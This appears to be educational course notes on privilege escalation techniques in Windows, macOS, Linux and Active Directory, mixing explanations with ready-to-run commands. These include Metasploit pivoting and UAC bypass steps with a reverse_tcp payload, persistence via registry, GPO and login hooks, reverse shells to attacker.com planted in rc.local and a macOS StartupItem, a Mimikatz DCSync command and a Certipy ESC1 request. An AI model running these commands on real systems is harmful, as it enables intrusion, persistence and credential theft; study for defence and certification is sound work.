# 📶 Escalating Privileges
Escalating privileges is the second stage of system hacking. Attackers use passwords obtained in the first step to gain access to the target system and then try to attain higher-level privileges in the system.

Privilege escalation means gaining more access or control in a system than you’re supposed to have. Normally, users have limited access, but attackers first break in using a low-level account, then look for flaws or mistakes in the system to become an admin. Once they have admin rights, they can steal sensitive data, delete files, or install malware like viruses or Trojans to take full control.

## Types of Privilege Escalation
Privilege escalation takes place in two forms: vertical privilege escalation and horizontal privilege escalation.
- **Horizontal privilege escalation** is when a user gets access to another user’s data or functions who has the same level of access. For example, one bank user accessing another user’s account.
- **Vertical privilege escalation** is when a user gains higher-level access, like getting admin control. For example, a regular bank user accessing admin features of the banking site.

## Privilege Escalation Using DLL Hijacking 
DLL Hijacking is a technique where an attacker tricks a Windows program into loading a fake (malicious) DLL file instead of the real one. This happens when a program doesn’t mention the full path of the DLL it needs. Windows then looks for the DLL in the same folder as the program. If the attacker has placed a fake DLL in that folder first, the program loads it — giving the attacker access or control over the system.

## Privilege Escalation by Exploiting Vulnerabilities
Privilege escalation by exploiting vulnerabilities means that attackers take advantage of weaknesses or coding errors in software or the operating system to gain more access than they should have. These flaws can let them run harmful commands or programs to bypass security and even get access to high-level user accounts. Hackers often search public sites like Exploit-DB [https://www.exploit-db.com] or VulDB [https://vuldb.com] to find and use these known vulnerabilities to increase their control over a system.

## Privilege Escalation Using Dylib Hijacking
Privilege Escalation using Dylib Hijacking in macOS is a technique where attackers take advantage of how macOS loads dynamic libraries (dylibs). If a program looks for a dylib in multiple places, an attacker can place a fake (malicious) dylib in one of those paths. When the program runs, it loads the malicious dylib instead of the real one. This lets the attacker run their code secretly, allowing things like persistence, process injection, and bypassing security tools.

## Privilege Escalation Using Spectre and Meltdown Vulnerabilities
Spectre and Meltdown are serious bugs found in modern computer processors (from Intel, AMD, and ARM) that were caused by speed-boosting features in the CPU. Attackers can abuse these flaws to secretly read sensitive data like passwords, encryption keys, and other private info stored in memory. This allows them to gain higher-level (privileged) access to systems. These attacks work by tricking the CPU into bypassing normal security checks through features like speculative execution and caching, affecting almost all devices—from PCs to servers and even cloud systems.

## Privilege Escalation Using Named Pipe Impersonation
Named Pipe Impersonation is a technique where attackers take advantage of how processes in Windows communicate using files called named pipes. Normally, one process (the server) creates a pipe, and another process (the client) connects to it to exchange data.

In this attack, the attacker creates a pipe server with low privileges and waits for a high-privilege process (like one running as admin) to connect. When it connects, the attacker tricks the system into letting them act with the higher privileges of that process.

Using tools like Metasploit, attackers then use commands like `getsystem` to escalate their privileges and access things like admin passwords or system files.

## Privilege Escalation by Exploiting Misconfigured Services 
Privilege escalation by exploiting misconfigured services means attackers take advantage of weak or unsafe system settings instead of using new (zero-day) exploits. If system services are not set up securely—like having unprotected paths, wrong permissions, or editable registry settings—attackers can use these mistakes to gain higher access. Tools like Metasploit help them get into the system, and tools like PowerSploit help them find and exploit these misconfigurations to take full control.

### Unquoted Service Paths
Unquoted Service Paths in Windows happen when a service's file path isn’t inside quotation marks and has spaces in it. This can confuse the system into looking in the wrong folders for the file. If the service runs with high privileges (like SYSTEM), attackers can place a fake file in one of those folders. When Windows runs the service, it may launch the attacker’s file instead — giving them higher system privileges.

### Service Object Permissions
Service Object Permissions refer to the settings that control who can manage or change a Windows service. If these permissions are not set correctly, an attacker can take advantage of them to replace the service's program with a malicious one. This allows the attacker to run their own code with system-level permissions. They can even use this access to create a new user and add it to the administrator group, giving them full control over the system.

### Unattended installs
Unattended installs are a way to set up Windows automatically without needing someone to click through the setup steps. During this process, a file called **Unattend.xml** is created, which stores all the setup information—like usernames, local accounts, and sometimes even passwords (in plain or easily decoded form).

This file is saved in specific system folders like:

* `C:\Windows\Panther\`
* `C:\Windows\Panther\UnattendGC\`
* `C:\Windows\System32\`
* `C:\Windows\System32\sysprep\`

If attackers get access to this file, they can read sensitive data and use it to gain higher privileges on the system. That's why it's important for administrators to delete or secure this file after installation.

## Pivoting and Relaying to Hack External Machines 
Pivoting and relaying are methods used by attackers **after they hack into one system** in a network.

Once they control that first system (called the *compromised system*), they use it as a **bridge** to reach other systems inside the network that they normally couldn’t access directly.

* **Pivoting** is like jumping from one system to another. The attacker uses the hacked system to **launch attacks on other internal systems**.

* **Relaying** means using the hacked system to **access files, services, or other resources** on different systems inside the network without attacking them directly.

In both cases, the attacker is using the compromised system as a stepping stone to move deeper into the network.

The following diagrams illustrate the pivoting and relaying techniques:
![Pivoting Relaying](https://github.com/user-attachments/assets/c9a46a0e-6169-4b73-b62f-5a951181ed66)

### Pivoting
Pivoting is a hacking technique where an attacker first breaks into one computer inside a network, and then uses that compromised machine as a bridge to reach and attack other systems within the same internal network that may not be directly accessible. This is useful for bypassing firewalls and gaining deeper access into a target network.

#### Steps to perform Pivoting
```bash
# Step 1: Discover live hosts inside the internal network using ARP scan
> run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24
# → This command finds active systems in the target subnet via the compromised machine

# Step 2: Set up routing rules to pivot through the compromised system
> background
# → Sends current Meterpreter session to background

> route add 10.10.10.0 255.255.255.0 1
# → Tells Metasploit to send all traffic for 10.10.10.0/24 through session 1

# Step 3: Scan for open ports on the discovered live systems
> use auxiliary/scanner/portscan/tcp
# → Loads the TCP port scanning module

> set RHOSTS 10.10.10.5,10.10.10.6
# Specifies the internal IPs of discovered systems

> set PORTS 1-1000
# → Specifies the range of ports to scan

> run
# → Starts the port scan on the internal systems

# Step 4: Exploit vulnerable services discovered on scanned ports
> use exploit/windows/local/bypassuac
# → Loads the UAC bypass exploit module

> set SESSION 2
# → Targets a specific session on the internal network

> run
# → Executes the UAC bypass exploit
```
### Relaying 
Relaying is a technique used by attackers when direct access to a system isn’t possible. Instead of attacking the target system directly, they use a previously compromised system inside the network as a middleman (or "relay") to access other systems. This allows attackers to make it look like requests are coming from the already-compromised machine.
#### Steps to perform Pivoting
```bash
# Step 1: Set up port forwarding from the compromised system

portfwd -l 10080 -p 80 -r <target> 		# → This forwards local port 10080 to the target's port 80 (HTTP service)
portfwd -l 10022 -p 22 -r <target>		# → This forwards local port 10022 to the target's port 22 (SSH service)
portfwd -l 100445 -p 445 -r <target>		# → This forwards local port 100445 to the target's port 445 (SMB service)

-l: local port to listen on your system
-p: port on the target system you want to access
-r: IP address of the remote target system

# Step 2: Access the remote services via the forwarded local ports

curl http://localhost:10080			# → Access HTTP service of target using browser or curl
ssh myadmin@localhost -p 10022			# → Access SSH service on the target
smbclient //localhost/share -p 100445		# → Access SMB service using a tool like smbclient or file explorer

```

## Privilege Escalation Using Misconfigured NFS 
**Privilege Escalation Using Misconfigured NFS** means taking advantage of weaknesses in how NFS (Network File System) is set up. NFS is used to share files between computers on the same internal network using port 2049. If it’s not properly secured, attackers can connect to it using a normal or low-privileged account and gain full (root) access to the system. Once inside, they can read sensitive files, steal data, or launch more attacks on the network.

#### Steps Involved in Gaining Root Access of the Target Host:
```bash
# Step 1: Scan the target to see if NFS is running and get service version info
nmap -sV <Target_IP>
# → Checks for open ports and services, helps identify if NFS is active on the target.

# Step 2: Install NFS tools on your system to interact with NFS shares
sudo apt-get install nfs-common
# → Installs required NFS client tools on your machine.

# Step 3: Check what directories are shared by the target over NFS
showmount -e <Target_IP>
# → Lists exportable (mountable) directories on the target system.

# Step 4: Create a directory on your machine to mount the NFS share
mkdir /tmp/nfs
# → Makes a folder to attach (mount) the remote NFS share.

# Step 5: Mount the NFS share from the target to your local directory
sudo mount -t nfs <Target_IP>:/<Share_Dir> /tmp/nfs
# → Mounts the remote share locally so you can browse/edit its content.

# Step 6: Go into the mounted share, copy bash, and check permissions
cd /tmp/nfs
sudo cp /bin/bash .
ls -la
# → Copies /bin/bash into the share and lists file permissions (helps to check if root-owned or writable).

# Step 7: SSH into the target machine using a valid username
ssh -l <Username> <Target_IP>
# → Connects to the target system via SSH, using the credentials you might have or guessed earlier.
```

## Privilege Escalation by Bypassing User Account Control (UAC)
Privilege Escalation by bypassing UAC means attackers try to gain higher access (like system-level) on a Windows machine without alerting the user. If normal methods fail, they trick the user into running a special file. Some trusted Windows apps can be misused to bypass UAC security silently, or the attacker may hide malware inside these trusted apps to avoid any warning and still get admin access.

### 🧠 What is UAC Bypass?
UAC (User Account Control) is a Windows feature that limits application privileges—even for admin users. Attackers bypass UAC to gain elevated privileges (like SYSTEM) without user consent.

### Techniques to Bypass UAC Using Metasploit

---
### 🔓 1. **Bypass UAC via Process Injection**

#### 📖 **Description:**

Injects shellcode into a process to **elevate privileges silently**.

```bash
msf > use exploit/windows/local/bypassuac             # → Loads UAC bypass module via process injection.
msf exploit(bypassuac) > set SESSION 1                # → Select the Meterpreter session to escalate.
msf exploit(bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp  # → Set the payload.
msf exploit(bypassuac) > set LHOST 10.10.14.99        # → Set attacker IP.
msf exploit(bypassuac) > exploit                      # → Run the exploit to get a new elevated session.
```

---

### 🧠 2. **Bypass UAC via Memory (DLL) Injection**

#### 📖 **Description:**

Uses **Reflective DLL Injection** to inject code directly into memory without writing to disk.

```bash
msf > use exploit/windows/local/bypassuac_injection   # → Loads UAC bypass module via memory injection.
msf exploit(bypassuac_injection) > set SESSION 1      # → Select the session to escalate.
msf exploit(bypassuac_injection) > set PAYLOAD windows/meterpreter/reverse_tcp	# → Set the payload.
msf exploit(bypassuac_injection) > set LHOST 10.10.14.99

```

---

### 🗝️ 3. **Bypass UAC via FodHelper Registry Hijack**

#### 📖 **Description:**

Modifies **HKCU registry key** to execute **attacker code** when `fodhelper.exe` (a trusted UAC-exempt program) is run.

## Privilege Escalation by Abusing Boot or Logon Initialization Scripts
Privilege escalation by abusing boot or logon scripts means attackers take advantage of special scripts that run automatically when a computer starts or when someone logs in. These scripts can be used to run programs with higher privileges. Attackers use them to stay on the system (persistence) and sometimes to gain admin-level access. The exact method depends on the system and how the scripts are set up, but once misused, they allow attackers to control the system more easily.

### Discussed below are the various techniques used by attackers to apply boot or logon initialization scripts for escalating privileges. 
---

### 🔹 1. **Logon Script (Windows)**
Windows runs logon scripts when a user logs in. Attackers add their script to a registry key to make it run every time, gaining persistence or privilege escalation.

**Command:**

```powershell
# Adds attacker's script path to logon registry
Set-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value "C:\malicious_script.bat"
```

---

### 🔹 2. **Logon Script (macOS)**
macOS can run a "login hook" script as root when someone logs in. Attackers abuse this to run their malicious code as root.

**Command:**

```bash
# Set a login hook to execute attacker's script
sudo defaults write com.apple.loginwindow LoginHook /Users/attacker/malicious.sh
```

---

### 🔹 3. **Network Logon Scripts (Windows AD/GPO)**
Organizations can use AD/GPO to assign logon scripts across the network. Attackers modify these scripts to run malicious code on all user systems.

**Command:**

```powershell
# Example of setting a logon script via Group Policy
Set-GPRegistryValue -Name "LogonPolicy" -Key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "MaliciousScript" -Type String -Value "\\attacker\share\payload.bat"
```

---

### 🔹 4. **RC Scripts (Unix/Linux)**
RC scripts run during startup in Unix/Linux. Attackers add their commands to these scripts so that they are executed as root during boot.

**Command:**

```bash
# Add a reverse shell to rc.local
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" | sudo tee -a /etc/rc.local
sudo chmod +x /etc/rc.local
```

---

### 🔹 5. **Startup Items (macOS)**
macOS uses "Startup Items" to run services/scripts at boot. Attackers place malicious files here to auto-run as root on boot.

**Command:**

```bash
# Create a malicious startup item
sudo mkdir /Library/StartupItems/MaliciousItem
echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' | sudo tee /Library/StartupItems/MaliciousItem/MaliciousScript
sudo chmod +x /Library/StartupItems/MaliciousItem/MaliciousScript
```

## Privilege Escalation by Modifying Domain Policy
Privilege Escalation by Modifying Domain Policy means that attackers try to gain more power or control in a network by changing important settings in the domain. In a Windows Active Directory (AD) environment, domains manage how computers and users communicate. Attackers can change group policies or trust settings between domains to weaken security. Sometimes, they even create a fake domain controller (DC) to stay hidden and gain higher access. This helps them move around the network more easily and control more systems.

---

### 🛠 **Group Policy Modification**

Attackers modify Group Policy files to execute malicious actions like creating accounts, running scripts, or changing user rights.

#### 🔹 Modify Scheduled Tasks

They edit the `ScheduledTasks.xml` file to add a task that runs malware or scripts.

```bash
cat '<GPO_PATH>/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'
```

> **Purpose**: Modify tasks that auto-run malicious scripts using `New-GPOImmediateTask`.

#### 🔹 Modify User Rights

They change `GptTmpl.inf` to assign powerful privileges to attacker-controlled accounts.

```bash
cat '<GPO_PATH>/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf'
```

> **Purpose**: Add rights like `SeEnableDelegationPrivilege` to escalate control.

#### 🔹 Access Group Policies

Attackers browse the policy folder to find and alter GPOs.

```bash
ls '\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\'
```

> **Purpose**: Enumerate and tamper with policy files to deploy malware or extract plaintext passwords.

---

### 🔐 **Domain Trust Modification**

Attackers gather and manipulate trust relationships between domains to escalate privileges or move laterally.

#### 🔹 Enumerate Domain Trusts

They use the built-in `nltest` utility to find trust paths.

```bash
nltest /domain_trusts
```

> **Purpose**: Identify trusted domains to target Kerberoasting or Pass-the-Ticket attacks.

---

In summary:
* **Group Policy Modification** is about editing policy files to automate malicious tasks or give attackers higher privileges.
* **Domain Trust Modification** is about exploiting relationships between domains to move across systems or steal credentials.

These actions are often performed post-compromise for **privilege escalation** and **persistence**.

## Retrieving Password Hashes of Other Domain Controllers Using DCSync Attack
The **DCSync attack** is a method used by attackers to steal password hashes from a Domain Controller (DC) in a Windows network. To perform a DCSync attack, an attacker needs high-level permissions that allow them to copy or replicate sensitive data from the domain controller.


In simple words:

When a user changes their password, the update is shared (replicated) with all other domain controllers. In a DCSync attack, the hacker first gains **high-level access** (like Domain Admin). Then, they pretend to be a Domain Controller and request this replication data. As a result, they can **get users' password hashes**, including for admins.

Once they have these hashes, they can use them to:

* Create fake login tickets (Golden Ticket attack)
* Change or control user accounts
* Move around silently within the network (LOTL)
* Even install ransomware

So, DCSync lets attackers **steal login info without ever logging in** like normal users.

### DCSync Attack Stages 
The DCSync attack is performed in the following eight stages, which start from lower privileges and proceed to higher privileges.
* **Stage 1:** Performs external reconnaissance
* **Stage 2:** Compromises the targeted machine
* **Stage 3:** Performs internal reconnaissance
* **Stage 4:** Escalates local privileges
* **Stage 5:** Compromises credentials by sending commands to DC
* **Stage 6:** Performs admin-level reconnaissance
* **Stage 7:** Performs malicious remote code execution
* **Stage 8:** Gains domain admin credentials

![DCSync](https://github.com/user-attachments/assets/14667721-0708-432d-9809-44e1f804f031)

### How Attackers Compromise the Domain Controller (DC)
1. **Identify the Domain Controller** - The attacker first finds out which system in the network is the Domain Controller.
2. **Send a Replication Request** - The attacker sends a fake request asking the DC to replicate its data — just like another DC would do.
3. **Use Tools like Mimikatz** - The attacker may use tools like Mimikatz or send a command like GetNCChanges to trick the DC into responding.
4. **DC Shares Sensitive Data** - The DC thinks it's a legit request, agrees to replicate, and sends back sensitive info — like password hashes.
5. **Attacker Gains Access** - With the password hashes, the attacker can now crack them and gain high-level access inside the domain.

![DCC](https://github.com/user-attachments/assets/0ecba5a8-4879-48ea-b7fe-fa83c2fe9bf1)

### Tools for Performing a DCSync Attack
**Mimikatz** [https://github.com/ParrotSec/mimikatz] - Mimikatz is a command-line tool that allows attackers to obtain credentials from registry memory locations. Attackers leverage mimikatz to perform DCSync attacks. Mimikatz includes a DCSync command that utilizes the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to replicate the behavior of a legitimate DC. 

Attackers execute the following command to retrieve the NTLM password hashes of an administrator account:
`mimikatz “lsadump::dcsync /domain:(domain name) /user:Administrator”`

## Privilege Escalation by Abusing Active Directory Certificate Services (ADCS)
Active Directory Certificate Services (ADCS) is used in a Windows network to manage digital certificates for users, computers, and applications. It helps verify identities securely. However, if ADCS is not set up properly, it can become a security risk. An attacker with low-level access in the network can take advantage of weak certificate settings to steal passwords, gain higher privileges (like domain admin), and maintain access in the system. Tools like **Certipy** help attackers find and exploit these misconfigurations to move deeper into the network.

### Steps used to abuse ADCS certificate services:

#### 🔍 Step 1: Find vulnerable certificate templates
Scan the domain for misconfigured certificate templates (like ESC1) that allow privilege escalation.
```bash
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.1 -vulnerable -enabled
```
![1](https://github.com/user-attachments/assets/6b113363-d809-4edf-8ede-beacdd819d56)

---
#### 🔎 Step 2: Search for ESC1 vulnerability in the result
Quickly filter out certificate templates vulnerable to **ESC1**, where users can request certificates for *any* domain account.
```bash
grep ESC1 domain.local_*.txt
```

![2](https://github.com/user-attachments/assets/6d5bfe42-11ce-4fcb-afb1-b3d64f9f10a0)

---
#### 📁 Step 3: Check who can enroll for the vulnerable template
Confirm if any normal user can abuse this to impersonate a Domain Admin.

> Open the output `.txt` or `.json` file and look for templates where **Domain Users** or **Authenticated Users** can enroll.

![3](https://github.com/user-attachments/assets/fc79bc25-354b-421c-9c12-989f095b88b4)
![4](https://github.com/user-attachments/assets/5b093a19-9308-400a-8488-27552913e0c1)

---
#### 🪪 Step 4: Request a certificate as a privileged account
Use the vulnerable template to request a certificate **as Domain Admin**, and get access to the domain.
```bash
certipy req -u 'user@domain.local' \
  -p 'Password123' \
  -dc-ip 10.10.10.1 \
  -target 'domain.local' \
  -ca 'corp-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@domain.local'
```

---

You find a misconfigured certificate template (ESC1), check if any domain user can enroll, and then use Certipy to request a certificate as **Administrator**, giving you high-level access.
